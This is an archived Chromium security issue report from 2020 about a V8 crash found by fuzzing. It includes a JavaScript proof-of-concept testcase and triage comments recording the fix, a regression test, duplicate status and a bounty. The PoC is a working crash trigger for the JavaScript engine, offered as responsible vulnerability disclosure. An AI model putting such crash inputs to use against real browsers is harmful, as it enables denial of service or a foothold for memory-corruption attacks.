# Security: Crash - Signal 11 SEGV_ACCERR 

| Field | Value |
|-------|-------|
| **Issue ID** | [40053653](https://issues.chromium.org/issues/40053653) |
| **Status** | Assigned |
| **Severity** | Unknown |
| **Priority** | P4 |
| **Component** | Blink>JavaScript |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | b3...@gmail.com |
| **Assignee** | mb...@google.com |
| **Created** | 2020-10-19 |
| **Bounty** | $500.00 |

## Description

Target : ASAN-D8-DBG Latest  

Crash Type: Signal 11 SEGV\_ACCERR  

Crash State:

# 

# Received signal 11 SEGV\_ACCERR 1a81beadbeee

# Segmentation fault (core dumped)

# 

# 

POC:  

**-------------------------** -  

function main() {  

for (let v3 = 0; v3 < 120; v3++) {  

const v6 = [Int16Array,1111];  

let v12 = 577623200;  

const v14 = [2];  

const v18 = [1.7976931348623157e+308,1.7976931348623157e+308,1.7976931348623157e+308,1.7976931348623157e+308];  

const v20 = [1111,Uint8Array];  

const v21 = [v20,v20,v18,v20,1111,1111,1111,-1111];  

const v23 = [11.11,11.11,1.7976931348623157e+308,11.11,11.11];  

const v26 = -Infinity;  

const v27 = [v23,v26,1111,v18,Date,1111,-9007199254740992,v21];  

const v31 = [v14];  

const v32 = [v31,v12,"object",v21,1111,6.0,v18,v27,Int8Array];  

const v33 = ["65555",v26,v32];  

const v34 = v33.toLocaleString();  

let v35 = "659874589";  

v35 = v34;  

const v37 = [11.11,11.11,1111];  

const v38 = [v6];  

const v39 = [v38,v37,v38];  

v37[10000] = v23;  

v12 = v35;  

const v54 = [parseInt,v39];  

const v56 = String.fromCharCode();  

const v61 = [v12,1111,-9007199254740991,1111];  

const v63 = [11.11,v54,JSON,v61,11.11,v56,v61];  

const v64 = JSON.stringify(v63);  

const v65 = RegExp(v64);  

const v66 = v65.exec(v64);  

}  

}

main();  

**-------------------------** -

## \*\*\* - runtime flags - ()

\*\*\* This sample was found through context aware fuzzing .  

\*\*\* Fuzzer Generation - MK\_0.312 .

## Timeline

### cl...@chromium.org (2020-10-19)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6674003341410304.

### pa...@chromium.org (2020-10-19)

[Empty comment from Monorail migration]

[Monorail components: Blink>JavaScript]

### is...@chromium.org (2020-10-20)

[Empty comment from Monorail migration]

### cl...@chromium.org (2020-10-20)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6004580477632512.

### is...@chromium.org (2020-10-20)

[Empty comment from Monorail migration]

### is...@chromium.org (2020-10-20)

The issue was fixed on ToT by this revert: https://chromium-review.googlesource.com/c/v8/v8/+/2484402
Jakob, PTAL

### jg...@chromium.org (2020-10-21)

Martin, ptal - there's a reproducible test case here. Please confirm it no longer repros.

### jg...@chromium.org (2020-10-21)

[Empty comment from Monorail migration]

### mb...@google.com (2020-10-21)

Yes, it doesn't reproduce anymore.

### mb...@google.com (2020-10-21)

[Empty comment from Monorail migration]

### mb...@google.com (2020-10-21)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-10-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/8ed25cf3062b2644283868b410e0ae57e0f9ce3e

commit 8ed25cf3062b2644283868b410e0ae57e0f9ce3e
Author: Martin Bidlingmaier <mbid@google.com>
Date: Wed Oct 21 11:43:09 2020

[regexp] Add regression test for chromium:1139782

Bug: chromium:1139782,v8:10765
Change-Id: I417cd037b2587599b925cce08d8652b2df1985ce
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2488687
Reviewed-by: Jakob Gruber <jgruber@chromium.org>
Reviewed-by: Georg Neis <neis@chromium.org>
Commit-Queue: Martin Bidlingmaier <mbid@google.com>
Cr-Commit-Position: refs/heads/master@{#70679}

[add] https://crrev.com/8ed25cf3062b2644283868b410e0ae57e0f9ce3e/test/mjsunit/regress/regress-1139782.js


### [Deleted User] (2020-10-21)

[Empty comment from Monorail migration]

### ad...@google.com (2020-10-26)

[Empty comment from Monorail migration]

### ad...@google.com (2020-10-26)

The revert occurred due to https://crbug.com/chromium/1139304 which predates this. Marking as duplicate.

### [Deleted User] (2020-10-26)

[Empty comment from Monorail migration]

### ad...@google.com (2020-10-28)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

The VRP panel would not normally reward this because it is a duplicate of another bug. However, the information you provided was possibly helpful in enabling us to create the regression test in https://crbug.com/chromium/1139782#c12, so the VRP panel has decided to award $500 as a thank-you. Thanks!

### ad...@google.com (2020-10-28)

[Empty comment from Monorail migration]

### ad...@google.com (2020-10-29)

[Empty comment from Monorail migration]

### [Deleted User] (2021-01-27)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2021-01-27)

This issue was migrated from crbug.com/chromium/1139782?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedinto: crbug.com/chromium/1139304]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053653)*
